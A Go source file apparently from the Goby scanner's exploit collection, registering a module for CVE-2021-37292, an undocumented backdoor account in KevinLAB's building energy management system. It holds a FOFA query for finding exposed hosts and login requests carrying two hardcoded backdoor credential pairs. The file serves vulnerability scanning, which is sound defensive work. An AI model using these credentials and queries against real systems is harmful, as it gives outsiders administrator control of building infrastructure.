package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "KevinLAB BEMS Backdoor (CVE-2021-37292)",
    "Description": "<p>KevinLAB Building Energy Management System (KevinLAB BEMS) is a building energy management system of KevinLAB Company in Korea.</p><p>A security vulnerability exists in KevinLAB Building Energy Management System 1.0.0 that allows an attacker to log in with a background account with the highest administrator privileges and gain control of the system.</p>",
    "Impact": "<p>An Access Control vulnerability exists in KevinLAB Inc Building Energy Management System 4ST BEMS 1.0.0 due to an undocumented backdoor account. A malicious user can log in using the backdor account with admin highest privileges and obtain system control.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.kevinlab.com\">http://www.kevinlab.com</a></p><p/><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "4ST BEMS 1.0.0",
    "VulType": [
        "Backdoor"
    ],
    "Tags": [
        "Backdoor"
    ],
    "Translation": {
        "CN": {
            "Name": "KevinLAB BEMS 后门（CVE-2021-37292）",
            "Product": "4ST L-BEMS 1.0.0",
            "Description": "<p>KevinLAB Building Energy Management System（KevinLAB BEMS）是韩国 KevinLAB 公司的一个建筑能源管理系统。</p><p>KevinLAB Building Energy Management System 1.0.0 中存在安全漏洞，攻击者可以使用具有管理员最高权限的后台帐户登录并获得系统控制权。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.kevinlab.com\" target=\"_blank\">http://www.kevinlab.com</a></p><p><br></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可以通过使用具有最高管理权限的后门账号登录来利用此漏洞，获得完全的系统控制权。</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">在管理面板的用户设置中看不到后门用户，它还使用未记录的权限级别（admin_pk= 1），该权限级别允许 BEMS 远程提供的功能完全可用。</span><br></p>",
            "VulType": [
                "后门"
            ],
            "Tags": [
                "后门"
            ]
        },
        "EN": {
            "Name": "KevinLAB BEMS Backdoor (CVE-2021-37292)",
            "Product": "4ST BEMS 1.0.0",
            "Description": "<p>KevinLAB Building Energy Management System (KevinLAB BEMS) is a building energy management system of KevinLAB Company in Korea.</p><p>A security vulnerability exists in KevinLAB Building Energy Management System 1.0.0 that allows an attacker to log in with a background account with the highest administrator privileges and gain control of the system.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"http://www.kevinlab.com\" target=\"_blank\">http://www.kevinlab.com</a></p><p><br></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>An Access Control vulnerability exists in KevinLAB Inc Building Energy Management System 4ST BEMS 1.0.0 due to an undocumented backdoor account. A malicious user can log in using the backdor account with admin highest privileges and obtain system control.</p>",
            "VulType": [
                "Backdoor"
            ],
            "Tags": [
                "Backdoor"
            ]
        }
    },
    "FofaQuery": "body=\"requestUrl = '../http/index.php'\"",
    "GobyQuery": "body=\"requestUrl = '../http/index.php'\"",
    "Author": "twcjw",
    "Homepage": "http://www.kevinlab.com",
    "DisclosureDate": "2022-06-15",
    "References": [
        "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-37292"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202204-2807"
    ],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/http/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%5D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "result",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/http/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22developer1%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%221234%22%7D%5D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "result",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/http/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%5D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "result",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/http/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22developer1%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%221234%22%7D%5D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "result",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.2",
    "PostTime": "2023-07-28",
    "PocId": "10473"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
